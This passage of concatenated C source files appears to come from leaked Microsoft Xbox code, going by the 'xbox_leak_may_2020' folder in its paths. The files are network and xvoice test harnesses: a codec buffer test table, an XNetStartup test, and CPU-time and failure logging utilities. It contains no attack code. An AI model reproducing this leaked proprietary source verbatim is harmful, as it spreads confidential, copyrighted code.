    { MediaProcess, "Process, 10 Buffers, 100ms, Voxware SC03, 4", 4, WAVE_FORMAT_VOXWARE_SC03, 10, 100 },
    { MediaProcess, "Process, 10 Buffers, 20ms, Voxware SC06, 1",  1, WAVE_FORMAT_VOXWARE_SC06, 10, 20  },
    { MediaProcess, "Process, 10 Buffers, 20ms, Voxware SC06, 4",  4, WAVE_FORMAT_VOXWARE_SC06, 10, 20  },
    { MediaProcess, "Process, 50 Buffers, 20ms, Voxware SC06, 1",  1, WAVE_FORMAT_VOXWARE_SC06, 50, 20  },
    { MediaProcess, "Process, 50 Buffers, 20ms, Voxware SC06, 4",  4, WAVE_FORMAT_VOXWARE_SC06, 50, 20  },
    { MediaProcess, "Process, 5 Buffers, 40ms, Voxware SC06, 1",   1, WAVE_FORMAT_VOXWARE_SC06, 5,  40  },
    { MediaProcess, "Process, 5 Buffers, 40ms, Voxware SC06, 4",   4, WAVE_FORMAT_VOXWARE_SC06, 5,  40  },
    { MediaProcess, "Process, 25 Buffers, 40ms, Voxware SC06, 1",  1, WAVE_FORMAT_VOXWARE_SC06, 25, 40  },
    { MediaProcess, "Process, 25 Buffers, 40ms, Voxware SC06, 4",  4, WAVE_FORMAT_VOXWARE_SC06, 25, 40  },
    { MediaProcess, "Process, 2 Buffers, 100ms, Voxware SC06, 1",  1, WAVE_FORMAT_VOXWARE_SC06, 2,  100 },
    { MediaProcess, "Process, 2 Buffers, 100ms, Voxware SC06, 4",  4, WAVE_FORMAT_VOXWARE_SC06, 2,  100 },
    { MediaProcess, "Process, 10 Buffers, 100ms, Voxware SC06, 1", 1, WAVE_FORMAT_VOXWARE_SC06, 10, 100 },
    { MediaProcess, "Process, 10 Buffers, 100ms, Voxware SC06, 4", 4, WAVE_FORMAT_VOXWARE_SC06, 10, 100 }
};

#define MediaProcessFunctionTableCount (sizeof(MediaProcessFunctionTable) / sizeof(MEDIA_PROCESS_FUNCTION_TABLE))



void __cdecl main()
{
    // hMemObject is the mem object
    HANDLE  hMemObject = INVALID_HANDLE_VALUE;
    // hLogAll is the handle to the log object
    HANDLE  hLogAll = INVALID_HANDLE_VALUE;
    // lpszLogFileNameAll is the name of the log file
    LPSTR   lpszLogFileNameAll = "T:\\xvoicemem_all.log";
    // dwTestIndex is a counter to enumerate each test
    DWORD   dwTestIndex = 0;



    // Create the private heap
    hMemObject = xMemCreate();

    // Open the log file
    hLogAll = CreateFile(lpszLogFileNameAll, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    // Flush the file buffers to prevent corruption
    FlushFileBuffers(hLogAll);

    // Initialize
    if (FALSE == DeviceInit(hLogAll)) {
        goto ExitTest;
    }

    for (dwTestIndex = 0; dwTestIndex < MediaProcessFunctionTableCount; dwTestIndex++) {
        MediaProcessFunctionTable[dwTestIndex].pFunction(hLogAll, MediaProcessFunctionTable[dwTestIndex].lpszTestName, hMemObject, MediaProcessFunctionTable[dwTestIndex].dwNumObjects, MediaProcessFunctionTable[dwTestIndex].dwCodecTag, MediaProcessFunctionTable[dwTestIndex].wNumPackets, MediaProcessFunctionTable[dwTestIndex].wMsOfDataPerPacket);
    }

ExitTest:
    // Flush the file buffers to prevent corruption
    FlushFileBuffers(hLogAll);

    // Close the log file
    CloseHandle(hLogAll);

    // Free the private heap
    xMemClose(hMemObject);

    XLaunchNewImage(NULL, NULL);

    __asm int 3;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\xvoice\mem\precomp.h ===
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Copyright (c) Microsoft Corporation

Module Name:

    precomp.h

Abstract:

    Pre-compiled header file

Author:

    Steven Kehrli (steveke) 23-Oct-2001

Environment:

    XBox

Revision History:

------------------------------------------------------------------------------*/

#include <nt.h>
#include <ntrtl.h>
#include <nturtl.h>
#include <xtl.h>
#include <stdio.h>
#include <ntos.h>
#include <xvoice.h>

#include <xmem.h>

#include "util.h"
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\xvoice\mem\util.h ===
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Copyright (c) Microsoft Corporation

Module Name:

  util.h

Abstract:

  This module contains the definitions for util.c

Author:

  Steven Kehrli (steveke) 2-Jan-2002

Environment:

  XBox

Revision History:

------------------------------------------------------------------------------*/

#ifndef _UTIL_H
#define _UTIL_H

#include "precomp.h"



// Function prototypes

// Stats

VOID
GetStats(
    IN OUT MM_STATISTICS  *mmStats,
    IN OUT PS_STATISTICS  *psStats
);

VOID
CheckStats(
    IN  HANDLE         hLog,
    IN  MM_STATISTICS  *mmStatsInitial,
    IN  MM_STATISTICS  *mmStatsFinal,
    IN  PS_STATISTICS  *psStatsInitial,
    IN  PS_STATISTICS  *psStatsFinal
);



// Logging

VOID
Log_va(
    IN  HANDLE  hLog,
    IN  BOOL    bEcho,
    IN  LPSTR   lpszFormatString,
    IN  ...
);

#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\xnetapi\startup.c ===
/*
 * File             :       Startup.c
 * Author           :       Jim Y
 * Revision History
 *      Jun/02/2001   JimY        Created
 *
 * This file contains code for testing the XNetStartup() API
 */


#include <precomp.h>

#define PASS 0
#define FAIL 1


//
// Functions local to this module
//
#define BREAK_INTO_DEBUGGER __asm int 3
#define WARNFAIL(_apiname) \
        DbgPrint(#_apiname " failed: %d %d\n", err, GetLastError())




/*
 * Main 
 *
 *
 */

void DoStartup(HANDLE hLog) {

    DWORD dwLinkStatus = 0;
    INT nResult = 0;
    INT nSleepDelay = 2000;


    //
    // Verify the network is connected before running tests
    //

    Sleep(nSleepDelay);
    dwLinkStatus = XNetGetEthernetLinkStatus();
    DbgPrint("Startup.C: After dwLinkStatus = %d \n", dwLinkStatus);

    xStartVariation(hLog, "API Verify net link status");
    if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_ACTIVE) )   {
        DbgPrint("Startup.C: ERROR - LinkStatus appears to NOT active [Status = %d]! \n", dwLinkStatus);
        xLog(hLog, XLL_FAIL, "API Verify net link status");
        goto Stop;
    }
    xLog(hLog, XLL_PASS, "API Verify net link status");


    //
    // Testcase: API parameter is NULL
    //

    xStartVariation(hLog, "API parameter is NULL");
    DbgPrint("Startup.C: API parameter is NULL\n");

    nResult = XNetStartup(NULL);
    DbgPrint("Startup.C: After nResult = %d \n", nResult);

    if (nResult != PASS)
        xLog(hLog, XLL_FAIL, "API parameter is NULL");
    else
        xLog(hLog, XLL_PASS, "API parameter is NULL");





    xEndVariation( hLog );


Stop:

    DbgPrint("Startup.C: Test has finished running!\n");


}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\xvoice\perf\util.h ===
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Copyright (c) Microsoft Corporation

Module Name:

  util.h

Abstract:

  This module contains the definitions for util.c

Author:

  Steven Kehrli (steveke) 23-Oct-2001

Environment:

  XBox

Revision History:

------------------------------------------------------------------------------*/

#ifndef _UTIL_H
#define _UTIL_H

#include "precomp.h"



// Function prototypes

// Stats

VOID
GetCpuTimes(
    ULONG  *KernelTime,
    ULONG  *InterruptTime,
    ULONG  *DpcTime,
    ULONG  *IdleTime
);

VOID
CalculateStatsDiff(
    IN     ULONG  KernelTimeInitial,
    IN     ULONG  KernelTimeFinal,
    IN     ULONG  InterruptTimeInitial,
    IN     ULONG  InterruptTimeFinal,
    IN     ULONG  DpcTimeInitial,
    IN     ULONG  DpcTimeFinal,
    IN     ULONG  IdleTimeInitial,
    IN     ULONG  IdleTimeFinal,
    IN OUT ULONG  *KernelTimeDiff,
    IN OUT ULONG  *InterruptTimeDiff,
    IN OUT ULONG  *DpcTimeDiff,
    IN OUT ULONG  *IdleTimeDiff
);

VOID
CalculateAndAddStatsDiff(
    IN     ULONG  KernelTimeInitial,
    IN     ULONG  KernelTimeFinal,
    IN     ULONG  InterruptTimeInitial,
    IN     ULONG  InterruptTimeFinal,
    IN     ULONG  DpcTimeInitial,
    IN     ULONG  DpcTimeFinal,
    IN     ULONG  IdleTimeInitial,
    IN     ULONG  IdleTimeFinal,
    IN OUT ULONG  *KernelTimeDiff,
    IN OUT ULONG  *InterruptTimeDiff,
    IN OUT ULONG  *DpcTimeDiff,
    IN OUT ULONG  *IdleTimeDiff
);



// Logging

VOID
Log_va(
    IN  HANDLE  hLog,
    IN  BOOL    bEcho,
    IN  LPSTR   lpszFormatString,
    IN  ...
);

VOID
LogCodecCreateBanner(
    IN  HANDLE  hLog
);

VOID
LogDeviceCreateBanner(
    IN  HANDLE  hLog
);

VOID
LogProcessBanner(
    IN  HANDLE  hLog
);

VOID
LogStats(
    IN  HANDLE  hLog,
    IN  LPSTR   lpszBanner,
    IN  DWORD   dwTestIteration,
    IN  ULONG   KernelTimeInitial,
    IN  ULONG   KernelTimeFinal,
    IN  ULONG   InterruptTimeInitial,
    IN  ULONG   InterruptTimeFinal,
    IN  ULONG   DpcTimeInitial,
    IN  ULONG   DpcTimeFinal,
    IN  ULONG   IdleTimeInitial,
    IN  ULONG   IdleTimeFinal,
    IN  DWORD   *dwNumMicrophoneFailures,
    IN  DWORD   *dwNumHeadphoneFailures,
    IN  DWORD   *dwNumEncoderFailures,
    IN  DWORD   *dwNumDecoderFailures,
    IN  DWORD   *dwNumQueueFailures
);

VOID
LogStatsSummary(
    IN  HANDLE  hLog,
    IN  LPSTR   lpszBanner,
    IN  ULONG   KernelTime,
    IN  ULONG   InterruptTime,
    IN  ULONG   DpcTime,
    IN  ULONG   IdleTime,
    IN  DWORD   *dwNumMicrophoneFailures,
    IN  DWORD   *dwNumHeadphoneFailures,
    IN  DWORD   *dwNumEncoderFailures,
    IN  DWORD   *dwNumDecoderFailures,
    IN  DWORD   *dwNumQueueFailures,
    IN  DWORD   dwAverage
);

VOID
LogStatsCsv(
    IN  HANDLE  hLog,
    IN  LPSTR   lpszBanner,
    IN  ULONG   KernelTime,
    IN  ULONG   InterruptTime,
    IN  ULONG   DpcTime,
    IN  ULONG   IdleTime,
    IN  DWORD   *dwNumMicrophoneFailures,
    IN  DWORD   *dwNumHeadphoneFailures,
    IN  DWORD   *dwNumEncoderFailures,
    IN  DWORD   *dwNumDecoderFailures,
    IN  DWORD   *dwNumQueueFailures,
    IN  DWORD   dwAverage
);



VOID
LogStatsFailures(
    IN  HANDLE  hLog,
    IN  DWORD   *dwNumMicrophoneFailures,
    IN  DWORD   *dwNumHeadphoneFailures,
    IN  DWORD   *dwNumEncoderFailures,
    IN  DWORD   *dwNumDecoderFailures,
    IN  DWORD   *dwNumQueueFailures,
    IN  DWORD   dwAverage
);

#define LogStatsBanner(hLog) Log_va(hLog, FALSE, "Kernel Time (ms), Interrupt Time (ms), DPC Time (ms), Idle Time (ms), Total Time (ms), CPU Usage, Microphone Total Failures, Headphone Total Failures, Encoder Total Failures, Decoder Total Failures, Queue Total Failures, Microphone Average Failures, Headphone Average Failures, Encoder Average Failures, Decoder Average Failures, Queue Average Failures\r\n")

#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\xvoice\perf\util.c ===
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Copyright (c) Microsoft Corporation

Module Name:

  util.c

Abstract:

  This module contains the utility functions for xvoice

Author:

  Steven Kehrli (steveke) 23-Oct-2001

Environment:

  XBox

Revision History:

------------------------------------------------------------------------------*/

#include "precomp.h"



VOID
GetCpuTimes(
    ULONG  *KernelTime,
    ULONG  *InterruptTime,
    ULONG  *DpcTime,
    ULONG  *IdleTime
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Gets the kernel and idle time

Arguments:

  KernelTime - Kernel time
  InterruptTime - Interrupt time
  DpcTime - Dpc time
  IdleTime - Idle time

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // pkprcb is a pointer to the processor control block
    PKPRCB  pkprcb = NULL;



    // Update the system times
    __asm {
        pushfd
        cli
    };

    pkprcb = KeGetCurrentPrcb();

    *KernelTime = pkprcb->CurrentThread->KernelTime;
    *InterruptTime = pkprcb->InterruptTime;
    *DpcTime = pkprcb->DpcTime;
    *IdleTime = pkprcb->IdleThread->KernelTime;

    __asm popfd;
}



VOID
CalculateStatsDiff(
    IN     ULONG  KernelTimeInitial,
    IN     ULONG  KernelTimeFinal,
    IN     ULONG  InterruptTimeInitial,
    IN     ULONG  InterruptTimeFinal,
    IN     ULONG  DpcTimeInitial,
    IN     ULONG  DpcTimeFinal,
    IN     ULONG  IdleTimeInitial,
    IN     ULONG  IdleTimeFinal,
    IN OUT ULONG  *KernelTimeDiff,
    IN OUT ULONG  *InterruptTimeDiff,
    IN OUT ULONG  *DpcTimeDiff,
    IN OUT ULONG  *IdleTimeDiff
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Calculates the difference in each stat

Arguments:

  KernelTimeInitial - Initial kernel time
  KernelTimeFinal - Final kernel time
  InterruptTimeInitial - Initial interrupt time
  InterruptIdleFinal - Final interrupt time
  DpcTimeInitial - Initial dpc time
  DpcTimeFinal - Final dpc time
  IdleTimeInitial - Initial idle time
  IdleTimeFinal - Final idle time
  KernelTimeDiff - Diff kernel time
  InterruptTimeDiff - Diff interrupt time
  DpcTimeDiff - Diff dpc time
  IdleTimeDiff - Diff idle time

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // Calculate the diff
    *KernelTimeDiff = KernelTimeFinal - KernelTimeInitial;
    *InterruptTimeDiff = InterruptTimeFinal - InterruptTimeInitial;
    *DpcTimeDiff = DpcTimeFinal - DpcTimeInitial;
    *IdleTimeDiff = IdleTimeFinal - IdleTimeInitial;
}



VOID
CalculateAndAddStatsDiff(
    IN     ULONG  KernelTimeInitial,
    IN     ULONG  KernelTimeFinal,
    IN     ULONG  InterruptTimeInitial,
    IN     ULONG  InterruptTimeFinal,
    IN     ULONG  DpcTimeInitial,
    IN     ULONG  DpcTimeFinal,
    IN     ULONG  IdleTimeInitial,
    IN     ULONG  IdleTimeFinal,
    IN OUT ULONG  *KernelTimeDiff,
    IN OUT ULONG  *InterruptTimeDiff,
    IN OUT ULONG  *DpcTimeDiff,
    IN OUT ULONG  *IdleTimeDiff
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Calculates the difference in each stat and adds it to the difference

Arguments:

  KernelTimeInitial - Initial kernel time
  KernelTimeFinal - Final kernel time
  InterruptTimeInitial - Initial interrupt time
  InterruptTimeFinal - Final interrupt time
  DpcTimeInitial - Initial dpc time
  DpcTimeFinal - Final dpc time
  IdleTimeInitial - Initial idle time
  IdleTimeFinal - Final idle time
  KernelTimeDiff - Diff kernel time
  InterruptTimeDiff - Diff interrupt time
  DpcTimeDiff - Diff dpc time
  IdleTimeDiff - Diff idle time

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // Calculate the diff
    *KernelTimeDiff += (KernelTimeFinal - KernelTimeInitial);
    *InterruptTimeDiff += (InterruptTimeFinal - InterruptTimeInitial);
    *DpcTimeDiff += (DpcTimeFinal - DpcTimeInitial);
    *IdleTimeDiff += (IdleTimeFinal - IdleTimeInitial);
}



VOID
Log_va(
    IN  HANDLE  hLog,
    IN  BOOL    bEcho,
    IN  LPSTR   lpszFormatString,
    IN  ...
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Writes the string to the log file

Arguments:

  hLog - Handle to the log object
  bEcho - Specifies if string should be echoed to the debugger
  lpszFormatString - Pointer to the format string

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // varg_ptr is a pointer to the variable argument list
    va_list  varg_ptr = NULL;
    // szLogString is the string in the line of log output
    CHAR     szLogString[1024 + 1] = {'\0'};
    // dwBytesWritten is the number of bytes written to the file
    DWORD    dwBytesWritten = 0;



    // Get the variable argument list
    va_start(varg_ptr, lpszFormatString);

    // Format the variable argument list
    _vsnprintf(szLogString, 1024, lpszFormatString, varg_ptr);

    // Write the string to the log file
    WriteFile(hLog, szLogString, strlen(szLogString), &dwBytesWritten, NULL);

    if (TRUE == bEcho) {
        // Echo the string to the debugger
        OutputDebugStringA(szLogString);
    }
}



VOID
LogDeviceCreateBanner(
    IN  HANDLE  hLog
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Logs the device create column header banner to the log file

Arguments:

  hLog - Handle to the log object

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // Write the banner to the log file
    Log_va(hLog, FALSE, "Test, Object Type, Number of Objects, ");
    LogStatsBanner(hLog);
}



VOID
LogCodecCreateBanner(
    IN  HANDLE  hLog
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Logs the codec create column header banner to the log file

Arguments:

  hLog - Handle to the log object

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // Write the banner to the log file
    Log_va(hLog, FALSE, "Test, Object Type, Codec, Number of Objects, ");
    LogStatsBanner(hLog);
}



VOID
LogProcessBanner(
    IN  HANDLE  hLog
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Logs the process column header banner to the log file

Arguments:

  hLog - Handle to the log object

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // Write the banner to the log file
    Log_va(hLog, FALSE, "Test, Object Type, Number of Buffers, Buffer Size, Codec, Number of Objects, ");
    LogStatsBanner(hLog);
}



VOID
LogStats(
    IN  HANDLE  hLog,
    IN  LPSTR   lpszBanner,
    IN  DWORD   dwTestIteration,
    IN  ULONG   KernelTimeInitial,
    IN  ULONG   KernelTimeFinal,
    IN  ULONG   InterruptTimeInitial,
    IN  ULONG   InterruptTimeFinal,
    IN  ULONG   DpcTimeInitial,
    IN  ULONG   DpcTimeFinal,
    IN  ULONG   IdleTimeInitial,
    IN  ULONG   IdleTimeFinal,
    IN  DWORD   *dwNumMicrophoneFailures,
    IN  DWORD   *dwNumHeadphoneFailures,
    IN  DWORD   *dwNumEncoderFailures,
    IN  DWORD   *dwNumDecoderFailures,
    IN  DWORD   *dwNumQueueFailures
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Logs the stats to the log file

Arguments:

  hLog - Handle to the log object
  lpszBanner - Banner string
  dwTestIteration - Test iteration number
  KernelTimeInitial - Initial kernel time
  KernelTimeFinal - Final kernel time
  InterruptTimeInitial - Initial interrupt time
  InterruptTimeFinal - Final interrupt time
  DpcTimeInitial - Initial dpc time
  DpcTimeFinal - Final dpc time
  IdleTimeInitial - Initial idle time
  IdleTimeFinal - Final idle time
  dwNumMicrophoneFailures - Microphone creation failures
  dwNumHeadphoneFailures - Headphone creation failures
  dwNumEncoderFailures - Encoder creation failures
  dwNumDecoderFailures - Decoder creation failures
  dwNumQueueFailures - Queue creation failures

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // KernelTimeDiff is the diff in kernel time
    ULONG   KernelTimeDiff;
    // InterruptTimeDiff is the diff in interrupt time
    ULONG   InterruptTimeDiff;
    // DpcTimeDiff is the diff in dpc time
    ULONG   DpcTimeDiff;
    // IdleTimeDiff is the diff in idle time
    ULONG   IdleTimeDiff;
    // TotalTime is the total time
    ULONG   TotalTime;
    // CPUUsage is the CPU Usage (percentage)
    DOUBLE  CPUUsage;



    // Calculate the diff
    CalculateStatsDiff(KernelTimeInitial, KernelTimeFinal, InterruptTimeInitial, InterruptTimeFinal, DpcTimeInitial, DpcTimeFinal, IdleTimeInitial, IdleTimeFinal, &KernelTimeDiff, &InterruptTimeDiff, &DpcTimeDiff, &IdleTimeDiff);

    // Write the banner to the log file
    Log_va(hLog, TRUE, "**********\r\n%s - %d\r\n**********\r\n", lpszBanner, dwTestIteration);

    Log_va(hLog, TRUE, "Kernel Time (ms)\r\n");
    Log_va(hLog, TRUE, "    Final:             %14u\r\n", KernelTimeFinal);
    Log_va(hLog, TRUE, "    Initial:           %14u\r\n", KernelTimeInitial);
    Log_va(hLog, TRUE, "    Diff:              %14u\r\n", KernelTimeDiff);

    Log_va(hLog, TRUE, "Interrupt Time (ms)\r\n");
    Log_va(hLog, TRUE, "    Final:             %14u\r\n", InterruptTimeFinal);
    Log_va(hLog, TRUE, "    Initial:           %14u\r\n", InterruptTimeInitial);
    Log_va(hLog, TRUE, "    Diff:              %14u\r\n", InterruptTimeDiff);

    Log_va(hLog, TRUE, "DPC Time (ms)\r\n");
    Log_va(hLog, TRUE, "    Final:             %14u\r\n", DpcTimeFinal);
    Log_va(hLog, TRUE, "    Initial:           %14u\r\n", DpcTimeInitial);
    Log_va(hLog, TRUE, "    Diff:              %14u\r\n", DpcTimeDiff);

    Log_va(hLog, TRUE, "Idle Time (ms)\r\n");
    Log_va(hLog, TRUE, "    Final:             %14u\r\n", IdleTimeFinal);
    Log_va(hLog, TRUE, "    Initial:           %14u\r\n", IdleTimeInitial);
    Log_va(hLog, TRUE, "    Diff:              %14u\r\n", IdleTimeDiff);

    TotalTime = KernelTimeDiff + InterruptTimeDiff + DpcTimeDiff + IdleTimeDiff;

    if (0 == TotalTime) {
        CPUUsage = 0;
    }
    else {
        CPUUsage = 100 - (100 * ((DOUBLE) IdleTimeDiff / (DOUBLE) TotalTime));
    }
    Log_va(hLog, TRUE, "CPU Usage\r\n");
    Log_va(hLog, TRUE, "    Total Time (ms):   %14u\r\n", TotalTime);
    Log_va(hLog, TRUE, "    CPU Usage:         %14.3f\r\n", CPUUsage);

    if ((NULL != dwNumMicrophoneFailures) || (NULL != dwNumHeadphoneFailures) || (NULL != dwNumEncoderFailures) || (NULL != dwNumDecoderFailures) || (NULL != dwNumQueueFailures)) {
        Log_va(hLog, TRUE, "Failures\r\n");
        if (NULL != dwNumMicrophoneFailures) {
            Log_va(hLog, TRUE, "    Microphone:        %14u\r\n", *dwNumMicrophoneFailures);
        }
        if (NULL != dwNumHeadphoneFailures) {
            Log_va(hLog, TRUE, "    Headphone:         %14u\r\n", *dwNumHeadphoneFailures);
        }
        if (NULL != dwNumEncoderFailures) {
            Log_va(hLog, TRUE, "    Encoder:           %14u\r\n", *dwNumEncoderFailures);
        }
        if (NULL != dwNumDecoderFailures) {
            Log_va(hLog, TRUE, "    Decoder:           %14u\r\n", *dwNumDecoderFailures);
        }
        if (NULL != dwNumQueueFailures) {
            Log_va(hLog, TRUE, "    Queue:             %14u\r\n", *dwNumQueueFailures);
        }
    }

    // End the section
    Log_va(hLog, TRUE, "**********\r\n\r\n");
}



VOID
LogStatsSummary(
    IN  HANDLE  hLog,
    IN  LPSTR   lpszBanner,
    IN  ULONG   KernelTime,
    IN  ULONG   InterruptTime,
    IN  ULONG   DpcTime,
    IN  ULONG   IdleTime,
    IN  DWORD   *dwNumMicrophoneFailures,
    IN  DWORD   *dwNumHeadphoneFailures,
    IN  DWORD   *dwNumEncoderFailures,
    IN  DWORD   *dwNumDecoderFailures,
    IN  DWORD   *dwNumQueueFailures,
    IN  DWORD   dwAverage
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Logs the stats to the log file

Arguments:

  hLog - Handle to the log object
  lpszBanner - Banner string
  KernelTime - Kernel time
  InterruptTime - Interrupt time
  DpcTime - Dpc time
  IdleTime - Idle time
  dwNumMicrophoneFailures - Microphone creation failures
  dwNumHeadphoneFailures - Headphone creation failures
  dwNumEncoderFailures - Encoder creation failures
  dwNumDecoderFailures - Decoder creation failures
  dwNumQueueFailures - Queue creation failures
  dwAverage - Number to average stats

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // TotalTime is the total time
    ULONG   TotalTime;
    // CPUUsage is the CPU Usage (percentage)
    DOUBLE  CPUUsage;



    if (0 == dwAverage) {
        dwAverage = 1;
    }

    // Write the banner to the log file
    Log_va(hLog, TRUE, "**********\r\n%s\r\n**********\r\n", lpszBanner);

    // Log the stats
    Log_va(hLog, TRUE, "Kernel Time (ms):               %14.3f\r\n", ((DOUBLE) KernelTime / (DOUBLE) dwAverage));
    Log_va(hLog, TRUE, "Interrupt Time (ms):            %14.3f\r\n", ((DOUBLE) InterruptTime / (DOUBLE) dwAverage));
    Log_va(hLog, TRUE, "DPC Time (ms):                  %14.3f\r\n", ((DOUBLE) DpcTime / (DOUBLE) dwAverage));
    Log_va(hLog, TRUE, "Idle Time (ms):                 %14.3f\r\n", ((DOUBLE) IdleTime / (DOUBLE) dwAverage));

    TotalTime = KernelTime + InterruptTime + DpcTime + IdleTime;
    Log_va(hLog, TRUE, "Total Time (ms):                %14.3f\r\n", ((DOUBLE) TotalTime / (DOUBLE) dwAverage));

    if (0 == TotalTime) {
        CPUUsage = 0;
    }
    else {
        CPUUsage = 100 - (100 * ((DOUBLE) IdleTime / (DOUBLE) TotalTime));
    }
    Log_va(hLog, TRUE, "CPU Usage:                      %14.3f\r\n", CPUUsage);

    if ((NULL != dwNumMicrophoneFailures) || (NULL != dwNumHeadphoneFailures) || (NULL != dwNumEncoderFailures) || (NULL != dwNumDecoderFailures) || (NULL != dwNumQueueFailures)) {
        Log_va(hLog, TRUE, "Total Failures\r\n");
        if (NULL != dwNumMicrophoneFailures) {
            Log_va(hLog, TRUE, "    Microphone:                 %14u\r\n", *dwNumMicrophoneFailures);
        }
        if (NULL != dwNumHeadphoneFailures) {
            Log_va(hLog, TRUE, "    Headphone:                  %14u\r\n", *dwNumHeadphoneFailures);
        }
        if (NULL != dwNumEncoderFailures) {
            Log_va(hLog, TRUE, "    Encoder:                    %14u\r\n", *dwNumEncoderFailures);
        }
        if (NULL != dwNumDecoderFailures) {
            Log_va(hLog, TRUE, "    Decoder:                    %14u\r\n", *dwNumDecoderFailures);
        }
        if (NULL != dwNumQueueFailures) {
            Log_va(hLog, TRUE, "    Queue:                      %14u\r\n", *dwNumQueueFailures);
        }

        Log_va(hLog, TRUE, "Average Failures\r\n");
        if (NULL != dwNumMicrophoneFailures) {
            Log_va(hLog, TRUE, "    Microphone:                 %14.3f\r\n", (DOUBLE) *dwNumMicrophoneFailures / (DOUBLE) dwAverage);
        }
        if (NULL != dwNumHeadphoneFailures) {
            Log_va(hLog, TRUE, "    Headphone:                  %14.3f\r\n", (DOUBLE) *dwNumHeadphoneFailures / (DOUBLE) dwAverage);
        }
        if (NULL != dwNumEncoderFailures) {
            Log_va(hLog, TRUE, "    Encoder:                    %14.3f\r\n", (DOUBLE) *dwNumEncoderFailures / (DOUBLE) dwAverage);
        }
        if (NULL != dwNumDecoderFailures) {
            Log_va(hLog, TRUE, "    Decoder:                    %14.3f\r\n", (DOUBLE) *dwNumDecoderFailures / (DOUBLE) dwAverage);
        }
        if (NULL != dwNumQueueFailures) {
            Log_va(hLog, TRUE, "    Queue:                      %14.3f\r\n", (DOUBLE) *dwNumQueueFailures / (DOUBLE) dwAverage);
        }
    }

    // End the section
    Log_va(hLog, TRUE, "**********\r\n\r\n");
}



VOID
LogStatsCsv(
    IN  HANDLE  hLog,
    IN  LPSTR   lpszBanner,
    IN  ULONG   KernelTime,
    IN  ULONG   InterruptTime,
    IN  ULONG   DpcTime,
    IN  ULONG   IdleTime,
    IN  DWORD   *dwNumMicrophoneFailures,
    IN  DWORD   *dwNumHeadphoneFailures,
    IN  DWORD   *dwNumEncoderFailures,
    IN  DWORD   *dwNumDecoderFailures,
    IN  DWORD   *dwNumQueueFailures,
    IN  DWORD   dwAverage
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Logs the stats to the csv log file

Arguments:

  hLog - Handle to the log object
  lpszBanner - Banner string
  KernelTime - Kernel time
  InterruptTime - Interrupt time
  DpcTime - Dpc time
  IdleTime - Idle time
  dwNumMicrophoneFailures - Microphone creation failures
  dwNumHeadphoneFailures - Headphone creation failures
  dwNumEncoderFailures - Encoder creation failures
  dwNumDecoderFailures - Decoder creation failures
  dwNumQueueFailures - Queue creation failures
  dwAverage - Number to average stats

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // TotalTime is the total time
    ULONG   TotalTime;
    // CPUUsage is the CPU Usage (percentage)
    DOUBLE  CPUUsage;



    if (0 == dwAverage) {
        dwAverage = 1;
    }

    // Write the stats to the csv log file
    Log_va(hLog, FALSE, "%s,", lpszBanner);
    Log_va(hLog, FALSE, "%.3f,", ((DOUBLE) KernelTime / (DOUBLE) dwAverage));
    Log_va(hLog, FALSE, "%.3f,", ((DOUBLE) InterruptTime / (DOUBLE) dwAverage));
    Log_va(hLog, FALSE, "%.3f,", ((DOUBLE) DpcTime / (DOUBLE) dwAverage));
    Log_va(hLog, FALSE, "%.3f,", ((DOUBLE) IdleTime / (DOUBLE) dwAverage));

    TotalTime = KernelTime + InterruptTime + DpcTime + IdleTime;
    Log_va(hLog, FALSE, "%.3f,", ((DOUBLE) TotalTime / (DOUBLE) dwAverage));

    if (0 == TotalTime) {
        CPUUsage = 0;
    }
    else {
        CPUUsage = 100 - (100 * ((DOUBLE) IdleTime / (DOUBLE) TotalTime));
    }
    Log_va(hLog, FALSE, "%.3f,", CPUUsage);

    Log_va(hLog, FALSE, "%u,", (NULL == dwNumMicrophoneFailures) ? 0 : *dwNumMicrophoneFailures);
    Log_va(hLog, FALSE, "%u,", (NULL == dwNumHeadphoneFailures) ? 0 : *dwNumHeadphoneFailures);
